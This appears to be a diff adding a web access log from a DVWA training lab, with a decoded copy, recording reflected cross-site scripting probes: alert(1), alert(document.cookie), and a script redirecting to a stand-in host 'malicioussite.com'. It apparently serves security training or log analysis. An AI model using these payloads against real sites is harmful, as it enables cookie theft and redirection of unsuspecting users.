@@ -1,0 +1,18 @@
+192.168.31.183 - - [01/Mar/2022:08:52:41 -0800] "GET /dvwa/vulnerabilities/xss_r/ HTTP/1.1" 200 4224
+192.168.31.183 - - [01/Mar/2022:08:52:41 -0800] "GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1" 200 593
+192.168.31.183 - - [01/Mar/2022:08:52:54 -0800] "GET /dvwa/vulnerabilities/xss_r/?name= HTTP/1.1" 200 4224
+192.168.31.183 - - [01/Mar/2022:08:52:58 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=hacker HTTP/1.1" 200 4247
+192.168.31.183 - - [01/Mar/2022:08:53:06 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=john HTTP/1.1" 200 4245
+192.168.31.183 - - [01/Mar/2022:08:53:20 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%2F HTTP/1.1" 200 4266
+192.168.31.183 - - [01/Mar/2022:08:54:34 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E HTTP/1.1" 200 4280
+192.168.31.183 - - [01/Mar/2022:08:55:08 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Elocation.href%3D%27http%3A%2F%2Fmalicioussite.com%27%3C%2Fscript%3E HTTP/1.1" 200 4298
+
+DECODE
+192.168.31.183 - - [01/Mar/2022:08:52:41 -0800] "GET /dvwa/vulnerabilities/xss_r/ HTTP/1.1" 200 4224
+192.168.31.183 - - [01/Mar/2022:08:52:41 -0800] "GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1" 200 593
+192.168.31.183 - - [01/Mar/2022:08:52:54 -0800] "GET /dvwa/vulnerabilities/xss_r/?name= HTTP/1.1" 200 4224
+192.168.31.183 - - [01/Mar/2022:08:52:58 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=hacker HTTP/1.1" 200 4247
+192.168.31.183 - - [01/Mar/2022:08:53:06 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=john HTTP/1.1" 200 4245
+192.168.31.183 - - [01/Mar/2022:08:53:20 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script/ HTTP/1.1" 200 4266
+192.168.31.183 - - [01/Mar/2022:08:54:34 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script> HTTP/1.1" 200 4280
+192.168.31.183 - - [01/Mar/2022:08:55:08 -0800] "GET /dvwa/vulnerabilities/xss_r/?name=<script>location.href='http://malicioussite.com'</script> HTTP/1.1" 200 4298
